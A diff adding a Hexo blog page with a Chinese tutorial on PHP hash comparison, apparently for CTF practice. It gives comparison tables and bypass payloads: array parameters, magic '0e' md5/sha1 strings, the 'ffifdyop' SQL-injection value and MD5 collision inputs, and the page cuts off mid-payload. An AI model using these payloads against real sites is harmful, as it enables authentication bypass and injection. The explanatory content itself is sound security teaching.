@@ -1,0 +1,896 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Page 21 | n2ryx&#39;s Blog</title>
+  <meta name="author" content="n2ryx">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>n2ryx&#39;s Blog<span class="blink-fast">|</span></h1>
+</div>
+
+<div class="row page">
+
+	
+	<div class="col-md-9">
+	
+
+		<div class="slogan">
+
+
+		<i class="fa fa-heart blink-slow"></i>
+
+		Wish everything.
+
+</div>    
+
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2023/06/20/Php/Hash/" >Hash 比较</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-06-20  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="Hash-比较"><a href="#Hash-比较" class="headerlink" title="Hash 比较"></a>Hash 比较</h1><p><strong>散列算法（Hash Algorithm）</strong>，是一种从任意文件中创造小的数字「指纹」的方法。常见 Hash 算法有 MD5 和 SHA 系列：MD5 和 SHA1 ，SHA2-256 算法。</p>
+<h2 id="Php-特性"><a href="#Php-特性" class="headerlink" title="Php 特性"></a>Php 特性</h2><h3 id="Php字符串比较"><a href="#Php字符串比较" class="headerlink" title="Php字符串比较"></a>Php字符串比较</h3><p>字符串 与 字符串：判断值是否相等。</p>
+<p>字符串 与 数值：判断字符串第一个字母前的数字是否与比较的数值相等。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;123a&quot;</span>==<span class="number">123</span>)   <span class="comment">//bool(ture)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;123a&quot;</span>==<span class="string">&quot;123&quot;</span>) <span class="comment">//bool(false) </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="松散比较"><a href="#松散比较" class="headerlink" title="松散比较 (&#x3D;&#x3D;)"></a>松散比较 (&#x3D;&#x3D;)</h3><table>
+<thead>
+<tr>
+<th align="left">松散</th>
+<th align="left"><strong><code>TRUE</code></strong></th>
+<th align="left"><strong><code>FALSE</code></strong></th>
+<th align="left"><em>1</em></th>
+<th align="left"><em>0</em></th>
+<th align="left"><em>-1</em></th>
+<th align="left"><em>“1”</em></th>
+<th align="left"><em>“0”</em></th>
+<th align="left"><em>“-1”</em></th>
+<th align="left"><strong><code>NULL</code></strong></th>
+<th align="left"><em>array()</em></th>
+<th align="left"><em>“php”</em></th>
+<th align="left"><em>“”</em></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>1</em></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>0</em></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>-1</em></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>“1”</em></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>“0”</em></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>“-1”</em></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><strong><code>NULL</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>array()</em></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>“php”</em></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>“”</em></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+</tr>
+</tbody></table>
+<h3 id="严格比较"><a href="#严格比较" class="headerlink" title="严格比较 (&#x3D;&#x3D;&#x3D;)"></a>严格比较 (&#x3D;&#x3D;&#x3D;)</h3><table>
+<thead>
+<tr>
+<th align="left"></th>
+<th align="left"><strong><code>FALSE</code></strong></th>
+<th align="left"><em>1</em></th>
+<th align="left"><em>0</em></th>
+<th align="left"><em>-1</em></th>
+<th align="left"><em>“1”</em></th>
+<th align="left"><em>“0”</em></th>
+<th align="left"><em>“-1”</em></th>
+<th align="left"><strong><code>NULL</code></strong></th>
+<th align="left"><em>array()</em></th>
+<th align="left"><em>“php”</em></th>
+<th align="left"><em>“”</em></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>1</em></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>0</em></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>-1</em></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>“1”</em></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>“0”</em></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>“-1”</em></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><strong><code>NULL</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>array()</em></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>“php”</em></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>TRUE</code></strong></td>
+</tr>
+<tr>
+<td align="left"><em>“”</em></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+<td align="left"><strong><code>FALSE</code></strong></td>
+</tr>
+</tbody></table>
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>对于php强比较和弱比较：md5()，sha1()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>!==<span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hahaha&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure>
+
+<h3 id="0e绕过弱比较"><a href="#0e绕过弱比较" class="headerlink" title="0e绕过弱比较"></a>0e绕过弱比较</h3><p>对于某些特殊的字符串加密后得到的密文以0e开头，PHP会当作科学计数法来处理，也就是0的n次方，得到的值比较的时候都相同</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>!==<span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hahaha&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>md5</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">240610708:0e462097431906509019562988736854</span><br><span class="line">QLTHNDT:0e405967825401955372549139051580</span><br><span class="line">QNKCDZO:0e830400451993494058024219903391</span><br><span class="line">PJNPDWY:0e291529052894702774557631701704</span><br><span class="line">NWWKITQ:0e763082070976038347657360817689</span><br><span class="line">NOOPCJF:0e818888003657176127862245791911</span><br><span class="line">MMHUWUV:0e701732711630150438129209816536</span><br><span class="line">MAUXXQC:0e478478466848439040434801845361</span><br></pre></td></tr></table></figure>
+
+<p><strong>sha1</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10932435112: 0e07766915004133176347055865026311692244</span><br><span class="line">aaroZmOk: 0e66507019969427134894567494305185566735</span><br><span class="line">aaK1STfY: 0e76658526655756207688271159624026011393</span><br><span class="line">aaO8zKZF: 0e89257456677279068558073954252716165668</span><br><span class="line">aa3OFF9m: 0e36977786278517984959260394024281014729</span><br><span class="line">0e1290633704: 0e19985187802402577070739524195726831799</span><br></pre></td></tr></table></figure>
+
+<h3 id="md5-md5-a-0e绕过"><a href="#md5-md5-a-0e绕过" class="headerlink" title="md5(md5($a))0e绕过"></a>md5(md5($a))0e绕过</h3><p>以下字符串进行两次md5后以0e开头</p>
+<p>7r4lGXCH2Ksu2JNT3BYM<br>CbDLytmyGm2xQyaLNhWn<br>770hQgrBOjrcqftrlaZk</p>
+<h3 id="a-md5-a"><a href="#a-md5-a" class="headerlink" title="$a&#x3D;&#x3D;md5($a)"></a>$a&#x3D;&#x3D;md5($a)</h3><p>0e215962017 的 MD5 值也是由 0e 开头，在 PHP 弱类型比较中相等</p>
+<h3 id="md5绕过SQL"><a href="#md5绕过SQL" class="headerlink" title="md5绕过SQL"></a>md5绕过SQL</h3><p><code>ffifdyop</code>，经过md5函数后结果为 ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c；</p>
+<p>129581926211651571912466741651878684928，经过md5函数后结果为 \x06\xdaT0D\x9f\x8fo#\xdf\xc1’or’8；</p>
+<h3 id="NaN-和-INF"><a href="#NaN-和-INF" class="headerlink" title="NaN 和 INF"></a>NaN 和 INF</h3><p>NAN和INF，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至NaN&#x3D;&#x3D;&#x3D;NaN都是false，但md5(‘NaN’)&#x3D;&#x3D;&#x3D;md5(‘NaN’)为true。</p>
+<h3 id="md5-和-sha1碰撞"><a href="#md5-和-sha1碰撞" class="headerlink" title="md5 和 sha1碰撞"></a>md5 和 sha1碰撞</h3><p>使用碰撞可以绕过不同字符串，相同md5&#x2F;sha1的强比较</p>
+<h3 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a><strong>MD5碰撞</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2   </span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   </span><br><span class="line"></span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%</span><br><span class="line"></span><br><span 